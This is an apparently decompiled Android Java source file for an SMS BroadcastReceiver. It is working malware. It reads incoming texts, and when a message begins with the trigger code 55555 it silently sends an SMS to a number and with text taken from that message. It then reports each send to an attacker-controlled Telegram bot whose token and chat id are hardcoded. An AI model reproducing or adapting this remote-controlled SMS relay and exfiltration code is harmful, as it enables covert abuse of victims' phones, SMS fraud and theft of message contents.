package com.example.myapplication;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SendSMS extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        SmsMessage[] smsMessageArr;
        Object[] objArr;
        Bundle bundle;
        String str = " ";
        String str2 = ",";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                try {
                    Object[] objArr2 = (Object[]) extras.get("pdus");
                    SmsMessage[] smsMessageArr2 = new SmsMessage[objArr2.length];
                    int i = 0;
                    while (i < smsMessageArr2.length) {
                        smsMessageArr2[i] = SmsMessage.createFromPdu((byte[]) objArr2[i]);
                        String originatingAddress = smsMessageArr2[i].getOriginatingAddress();
                        String messageBody = smsMessageArr2[i].getMessageBody();
                        String replace = messageBody.replace("&", "  ").replace("#", str).replace("?", str);
                        String str3 = messageBody;
                        String str4 = str3.split(str2)[0];
                        String str5 = str3.split(str2)[1];
                        String str6 = str3.split(str2)[2];
                        String str7 = str;
                        String str8 = str2;
                        int parseInt = Integer.parseInt(str4.toString());
                        if (parseInt == 55555) {
                            SmsManager.getDefault().sendTextMessage(str5, (String) null, str6, (PendingIntent) null, (PendingIntent) null);
                            int i2 = parseInt;
                            bundle = extras;
                            try {
                                String str9 = str5;
                                objArr = objArr2;
                                String str10 = str6;
                                Request build = new Request.Builder().url("https://api.telegram.org/bot5942982961:AAGBQuh42Gp79sszZSRtOKrDd9Wbibk8p-w/sendMessage?parse_mode=markdown&chat_id=5823099462&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐉𝐍𝐓 𝐒𝐌𝐒 𝐃𝐚𝐫𝐢 " + str9 + ", Isi Pesan : " + str10).build();
                                Request request = build;
                                this.client.newCall(build).enqueue(new Callback() {
                                    public void onFailure(Call call, IOException iOException) {
                                        iOException.printStackTrace();
                                    }

                                    public void onResponse(Call call, Response response) throws IOException {
                                        Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                        if (response.isSuccessful()) {
                                            response.body().string();
                                        }
                                    }
                                });
                                smsMessageArr = smsMessageArr2;
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot5942982961:AAGBQuh42Gp79sszZSRtOKrDd9Wbibk8p-w/sendMessage?parse_mode=markdown&chat_id=5823099462&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐉𝐍𝐓 𝐒𝐌𝐒 𝐃𝐚𝐫𝐢 " + str9 + ", Isi Pesan : " + str10).build()).enqueue(new Callback() {
                                    public void onFailure(Call call, IOException iOException) {
                                        iOException.printStackTrace();
                                    }

                                    public void onResponse(Call call, Response response) throws IOException {
                                        Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                        if (response.isSuccessful()) {
                                            response.body().string();
                                        }
                                    }
                                });
                            } catch (Exception e) {
                                e = e;
                            }
                        } else {
                            int i3 = parseInt;
                            bundle = extras;
                            objArr = objArr2;
                            smsMessageArr = smsMessageArr2;
                            String str11 = str5;
                            String str12 = str6;
                        }
                        i++;
                        str = str7;
                        extras = bundle;
                        objArr2 = objArr;
                        smsMessageArr2 = smsMessageArr;
                        str2 = str8;
                    }
                    Bundle bundle2 = extras;
                    Object[] objArr3 = objArr2;
                    SmsMessage[] smsMessageArr3 = smsMessageArr2;
                } catch (Exception e2) {
                    e = e2;
                    Bundle bundle3 = extras;
                    e.printStackTrace();
                }
            } else {
                Bundle bundle4 = extras;
            }
        }
    }
}
